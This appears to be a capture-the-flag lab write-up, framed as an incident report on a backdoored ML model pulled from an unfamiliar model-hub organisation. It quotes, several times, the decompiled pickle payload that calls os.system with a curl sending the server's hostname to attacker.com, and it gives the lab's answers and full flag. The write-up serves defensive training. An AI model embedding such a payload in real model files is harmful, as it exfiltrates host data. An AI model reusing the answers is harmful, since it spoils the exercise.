# ML Supply-Chain Compromise — Incident Investigation Report

**Environment:** TryTrainMe Production ML Infrastructure
**Incident ID:** `2024-SC-0847`
**Investigation Type:** Machine Learning Supply-Chain Security
**Affected Component:** Production ML inference server
**Status:** Compromised production model identified; suspicious candidate model identified

---

## 1. Executive Summary

A security investigation was initiated after the Security Operations Center (SOC) detected unusual outbound HTTPS traffic from the production ML inference server.

The investigation identified a compromised production model that had been introduced during an unscheduled model replacement. The replacement model originated from an unfamiliar external organisation, `trustworthy-ai-lab`.

Analysis of the deployed `production_model.pkl` revealed a malicious Python pickle payload. When the model was deserialized, the payload invoked `os.system()` to execute a shell command. The command used `hostname` to obtain the identity of the production server and transmitted the result to an external attacker-controlled server using `curl`.

Further investigation of the engineering team's staged replacement, `candidate_model.h5`, identified a suspicious TensorFlow/Keras `Lambda` layer named `manipulate_output`. The inspection tool also revealed a second fragment of the attacker's campaign identifier.

The two fragments recovered from the beacon log and candidate model were combined to reconstruct the final flag:

```text
THM{b4ckd00r_1n_pl41n_s1ght}
```

---

# 2. Incident Timeline

The deployment log was examined first to establish the sequence of events.

### Original Model Deployment

```text
2024-01-05 09:15:22
Model registry: pulling code-review-bert v1.0.0

2024-01-05 09:15:23
Source: huggingface.co/verified-ml-team/code-review-bert

2024-01-05 09:15:26
Model deployed to production inference server
```

The original model was obtained from:

```text
verified-ml-team
```

### Replacement Model

On January 26, an update was requested:

```text
2024-01-26 14:32:10
Model update requested by ml-engineer@trytrainme.com
```

The replacement model originated from:

```text
huggingface.co/trustworthy-ai-lab/code-review-bert-v2
```

The deployment system explicitly recorded:

```text
New source organisation detected: trustworthy-ai-lab
```

The model was then deployed:

```text
2024-01-26 14:32:16
Model deployed to production inference server
```

### SOC Detection

The first SOC alert occurred on:

```text
2024-02-16 03:14:00
```

The alert identified:

```text
unusual outbound HTTPS traffic
```

The destination was subsequently identified as:

```text
attacker.com:443
```

---

# 3. Model Provenance Investigation

The deployment log showed that the production model was replaced with a model from a different organisation.

### Original Source

```text
huggingface.co/verified-ml-team/code-review-bert
```

### Replacement Source

```text
huggingface.co/trustworthy-ai-lab/code-review-bert-v2
```

### Finding

The replacement model originated from:

```text
trustworthy-ai-lab
```

This was significant because the deployment system explicitly identified it as a new source organisation.

**Answer:**

```text
trustworthy-ai-lab
```

---

# 4. Time Between Deployment and Detection

The malicious replacement model was deployed at:

```text
2024-01-26 14:32:16
```

The SOC alert was generated at:

```text
2024-02-16 03:14:00
```

The elapsed period was approximately:

```text
21 days
```

**Answer:**

```text
21
```

This indicates that the malicious model remained in production for approximately twenty days before the unusual network activity triggered the automated detection mechanism.

---

# 5. Production Model Analysis

The deployed model was:

```text
/opt/supply-chain/incident/models/production_model.pkl
```

Because the model used Python's pickle serialization format, `pickletools` was used to inspect its contents.

Command:

```bash
python3 -m pickletools models/production_model.pkl
```

The output contained:

```text
SHORT_BINUNICODE 'os'
SHORT_BINUNICODE 'system'
STACK_GLOBAL
```

It also contained the following command:

```text
curl "http://attacker.com/beacon" -d "host=$(hostname)"
```

The model was then decompiled with `fickling`:

```bash
fickling models/production_model.pkl
```

The resulting representation was:

```python
from os import system
_var0 = system('curl "http://attacker.com/beacon" -d "host=$(hostname)"')
result0 = _var0
```

This confirmed that the model contained executable code rather than being a normal passive model object.

---

# 6. Malicious Function

The decompiled payload imported:

```python
from os import system
```

and executed:

```python
system(...)
```

Therefore, the Python function used by the malicious payload was:

```text
os.system
```

**Answer:**

```text
os.system
```

---

# 7. Host Identity Collection

The malicious command was:

```bash
curl "http://attacker.com/beacon" -d "host=$(hostname)"
```

The command executed inside the shell to identify the host was:

```bash
hostname
```

The resulting hostname was observed in the captured request as:

```text
ml-server-prod-01
```

**Answer:**

```text
hostname
```

---

# 8. Network Activity Investigation

The network logs showed multiple connections from the production inference server.

Normal internal traffic was directed toward:

```text
api.internal.trytrainme.com
```

However, suspicious connections were observed to:

```text
attacker.com
```

with the destination IP:

```text
185.234.72.19
```

and destination port:

```text
443
```

The final suspicious connection was blocked by the SOC detection rule.

---

# 9. Beacon Analysis

The beacon capture log was examined:

```bash
cat logs/beacon_capture.log
```

The captured request contained:

```text
REQUEST POST /beacon HTTP/1.1
```

Therefore, the HTTP method used by the payload was:

```text
POST
```

**Answer:**

```text
POST
```

The captured payload also contained:

```text
host=ml-server-prod-01&id=THM{b4ckd00r_1n_
```

This provided the first portion of the campaign identifier.

---

# 10. Candidate Model Investigation

The engineering team had staged another model:

```text
models/candidate_model.h5
```

This model had not yet been deployed.

The provided inspection tool was located at:

```text
/opt/supply-chain/tools/inspect_h5_model.py
```

The model was inspected using:

```bash
python3 /opt/supply-chain/tools/inspect_h5_model.py models/candidate_model.h5
```

The inspection identified five layers:

```text
InputLayer
Flatten
Dense
Dense
Lambda
```

The Lambda layer generated a warning:

```text
[WARNING] Lambda manipulate_output
```

The tool identified the function as:

```text
manipulate_output
```

and reported:

```text
exfil_suffix: pl41n_s1ght}
```

The inspection tool also warned:

```text
Lambda (manipulate_output): Can contain arbitrary Python code that executes at inference time
```

---

# 11. Suspicious Layer

The suspicious layer was:

```text
Lambda: manipulate_output
```

The layer required review because Lambda layers can contain executable Python functionality that runs during model inference.

**Answer:**

```text
manipulate_output
```

---

# 12. Campaign Identifier Recovery

The incident materials indicated that the attacker deliberately split the campaign ID across two artefacts.

### Fragment 1 — Beacon Capture

The beacon contained:

```text
THM{b4ckd00r_1n_
```

### Fragment 2 — Candidate Model

The candidate model contained:

```text
pl41n_s1ght}
```

Combining the two fragments produced:

```text
THM{b4ckd00r_1n_pl41n_s1ght}
```

### Recovered Flag

```text
THM{b4ckd00r_1n_pl41n_s1ght}
```

---

# 13. Findings Summary

| Finding                        | Result                         |
| ------------------------------ | ------------------------------ |
| Replacement organisation       | `trustworthy-ai-lab`           |
| Replacement deployment         | `2024-01-26 14:32:16`          |
| SOC alert                      | `2024-02-16 03:14:00`          |
| Approximate time in production | `21 days`                      |
| Malicious model                | `production_model.pkl`         |
| Python execution function      | `os.system`                    |
| Host identification command    | `hostname`                     |
| Attacker destination           | `attacker.com:443`             |
| HTTP method                    | `POST`                         |
| Candidate model                | `candidate_model.h5`           |
| Suspicious layer               | `manipulate_output`            |
| Layer type                     | `Lambda`                       |
| Campaign fragment 1            | `THM{b4ckd00r_1n_`             |
| Campaign fragment 2            | `pl41n_s1ght}`                 |
| Recovered flag                 | `THM{b4ckd00r_1n_pl41n_s1ght}` |

---

# 14. Security Impact

The production model was capable of executing operating-system commands through malicious pickle deserialization.

The payload demonstrated the ability to:

1. Execute arbitrary shell commands.
2. Collect the production server's hostname.
3. Establish outbound communication with an external server.
4. Transmit collected information to the external server.
5. Operate without requiring a conventional application deployment.

The staged H5 model also presented a potential execution risk through its custom Lambda layer.

---

# 15. Indicators of Compromise

### Malicious Model

```text
production_model.pkl
```

### Candidate Model Layer

```text
manipulate_output
```

### External Domain

```text
attacker.com
```

### External IP

```text
185.234.72.19
```

### Destination Port

```text
443
```

### Endpoint

```text
/beacon
```

### Suspicious Command

```bash
curl "http://attacker.com/beacon" -d "host=$(hostname)"
```

### Campaign Identifier

```text
THM{b4ckd00r_1n_pl41n_s1ght}
```

---

# 16. Recommended Security Controls

The investigation highlights several controls that should be considered for ML model deployment pipelines.

## Model Provenance

Verify the origin and ownership of externally sourced models before deployment.

## Model Integrity

Use cryptographic hashes to verify that models have not been modified after approval.

## Safer Serialization

Avoid unsafe serialization formats such as Python pickle when possible.

Use safer model formats and explicitly validate model contents before loading them.

## Static Model Scanning

Automatically scan models before deployment for:

* Executable code
* Suspicious functions
* Custom layers
* Unexpected imports
* Embedded commands
* Serialization-based attacks

## Network Egress Controls

Production inference servers should have restricted outbound network access.

Unexpected connections to external destinations should trigger investigation.

## Runtime Isolation

Run model inference workloads in appropriately isolated environments with minimal privileges.

## Custom Layer Review

Custom Lambda layers and other executable model components should undergo security review before deployment.

---

# 17. Conclusion

The investigation established that the production ML environment had been compromised through a malicious model replacement.

The replacement originated from:

```text
trustworthy-ai-lab
```

and was deployed approximately twenty days before the SOC detected suspicious outbound traffic.

Decompilation of the production pickle confirmed the presence of an `os.system` payload that executed:

```bash
curl "http://attacker.com/beacon" -d "host=$(hostname)"
```

The command collected the production host's identity and transmitted it to an external destination.

The staged candidate model was also found to contain a suspicious Lambda layer named:

```text
manipulate_output
```

The investigation ultimately recovered the complete campaign identifier:

```text
THM{b4ckd00r_1n_pl41n_s1ght}
```

The incident demonstrates the importance of treating ML models as potentially executable supply-chain artefacts rather than automatically trusting them as passive data.